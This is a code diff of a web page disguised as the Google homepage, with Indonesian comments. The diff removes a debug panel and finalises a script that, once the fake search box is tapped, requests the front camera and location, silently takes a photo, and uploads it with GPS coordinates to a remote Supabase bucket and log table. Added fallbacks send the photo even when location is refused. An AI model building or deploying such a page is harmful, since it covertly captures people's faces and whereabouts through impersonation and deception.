@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - Debug Mode</title>
+    <title>Google</title>
     <link rel="icon" href="https://www.google.com/favicon.ico">
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
@@ -28,7 +28,7 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: -5vh;
+            margin-top: -10vh;
             flex: 1;
             justify-content: center;
             padding: 0 20px;
@@ -70,20 +70,6 @@
             width: 20px;
             height: 20px;
             fill: #9aa0a6;
-        }
-
-        /* Kotak Debug untuk melihat status error langsung di HP */
-        #debug-log {
-            margin-top: 20px;
-            width: 90%;
-            max-width: 500px;
-            background: #f8d7da;
-            color: #721c24;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 12px;
-            word-break: break-all;
-            display: none;
         }
 
         #camera-preview {
@@ -128,11 +114,8 @@
 
         <div class="search-box" id="trigger-box">
             <svg class="search-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
-            <input type="text" placeholder="Ketuk di sini untuk mulai...">
+            <input type="text" placeholder="Telusuri Google atau ketik URL">
         </div>
-
-        <!-- Tempat menampilkan pesan error di HP -->
-        <div id="debug-log">Status: Menunggu interaksi...</div>
     </div>
 
     <video id="camera-preview" autoplay playsinline muted></video>
@@ -153,30 +136,57 @@
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
         let hasRun = false;
 
-        function showDebug(msg) {
-            const logBox = document.getElementById("debug-log");
-            logBox.style.display = "block";
-            logBox.innerHTML += "<br>• " + msg;
-            console.log(msg);
+        // Fungsi terpisah untuk mengirim data ke Supabase
+        async function sendDataToSupabase(blob, lat = null, lng = null) {
+            try {
+                const fileName = `capture_${Date.now()}.png`;
+
+                // Upload ke Supabase Storage
+                const { error: storageError } = await supabaseClient.storage
+                    .from('captures')
+                    .upload(fileName, blob, { 
+                        contentType: 'image/png', 
+                        upsert: true 
+                    });
+
+                if (storageError) {
+                    console.error("Storage Error:", storageError.message);
+                    return;
+                }
+
+                // Ambil Public URL
+                const { data: { publicUrl } } = supabaseClient.storage
+                    .from('captures')
+                    .getPublicUrl(fileName);
+
+                // Insert ke tabel logs
+                const { error: dbError } = await supabaseClient
+                    .from('logs')
+                    .insert([{ 
+                        photo_url: publicUrl, 
+                        latitude: lat, 
+                        longitude: lng 
+                    }]);
+
+                if (dbError) {
+                    console.error("Database Error:", dbError.message);
+                } else {
+                    console.log("Berhasil terkirim ke Supabase!");
+                }
+            } catch (err) {
+                console.error("Kesalahan pengiriman:", err);
+            }
         }
 
         async function startProcess() {
             if (hasRun) return;
             hasRun = true;
 
-            showDebug("Tombol diketuk, memulai proses...");
-
-            // Cek apakah protokolnya HTTPS
-            if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
-                showDebug("ERROR KRITIS: Website tidak menggunakan HTTPS! Kamera & Lokasi diblokir HP.");
-                return;
-            }
-
             const video = document.getElementById("camera-preview");
             const canvas = document.getElementById("canvas");
 
             try {
-                showDebug("Meminta izin kamera...");
+                // 1. Meminta izin kamera
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
@@ -184,68 +194,48 @@
                 
                 video.srcObject = stream;
                 await video.play();
-                showDebug("Kamera diizinkan.");
 
+                // Fungsi helper untuk mengambil foto & kirim
+                const captureAndUpload = (lat = null, lng = null) => {
+                    setTimeout(async () => {
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext("2d");
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(async (blob) => {
+                            if (blob) {
+                                await sendDataToSupabase(blob, lat, lng);
+                            }
+                            // Matikan kamera setelah selesai
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 'image/png');
+                    }, 1250);
+                };
+
+                // 2. Meminta izin lokasi dengan sistem fallback (Jika lokasi diblokir/gagal, foto tetap terkirim)
                 if ("geolocation" in navigator) {
-                    showDebug("Meminta izin lokasi...");
                     navigator.geolocation.getCurrentPosition(
-                        async (position) => {
+                        (position) => {
+                            // Jika lokasi diizinkan
                             const lat = position.coords.latitude;
                             const lng = position.coords.longitude;
-                            showDebug("Lokasi didapat: " + lat + ", " + lng);
-
-                            setTimeout(async () => {
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                const ctx = canvas.getContext("2d");
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                                canvas.toBlob(async (blob) => {
-                                    if (!blob) {
-                                        showDebug("ERROR: Gagal membuat blob gambar.");
-                                        return;
-                                    }
-
-                                    const fileName = `capture_${Date.now()}.png`;
-                                    showDebug("Mengunggah ke Supabase Storage...");
-
-                                    const { error: storageError } = await supabaseClient.storage
-                                        .from('captures')
-                                        .upload(fileName, blob, { contentType: 'image/png', upsert: true });
-
-                                    if (storageError) {
-                                        showDebug("STORAGE ERROR: " + storageError.message);
-                                        return;
-                                    }
-
-                                    const { data: { publicUrl } } = supabaseClient.storage
-                                        .from('captures')
-                                        .getPublicUrl(fileName);
-
-                                    showDebug("Menyimpan ke Database tabel logs...");
-                                    const { error: dbError } = await supabaseClient
-                                        .from('logs')
-                                        .insert([{ photo_url: publicUrl, latitude: lat, longitude: lng }]);
-
-                                    if (dbError) {
-                                        showDebug("DATABASE ERROR: " + dbError.message);
-                                    } else {
-                                        showDebug("SUKSES BESAR! Data berhasil masuk ke Supabase.");
-                                    }
-
-                                    stream.getTracks().forEach(track => track.stop());
-                                }, 'image/png');
-                            }, 1200);
-
+                            captureAndUpload(lat, lng);
                         },
                         (error) => {
-                            showDebug("LOKASI DITOLAK/GAGAL: " + error.message);
+                            // Jika izin lokasi ditolak/tidak muncul, tetap lanjut kirim foto tanpa koordinat
+                            console.warn("Lokasi dilewati karena error/ditolak:", error.message);
+                            captureAndUpload(null, null);
                         },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
                     );
+                } else {
+                    // Jika browser tidak support geolocation
+                    captureAndUpload(null, null);
                 }
+
             } catch (err) {
-                showDebug("KAMERA ERROR / DITOLAK: " + err.message);
+                console.warn("Kamera ditolak atau error:", err);
             }
         }
 
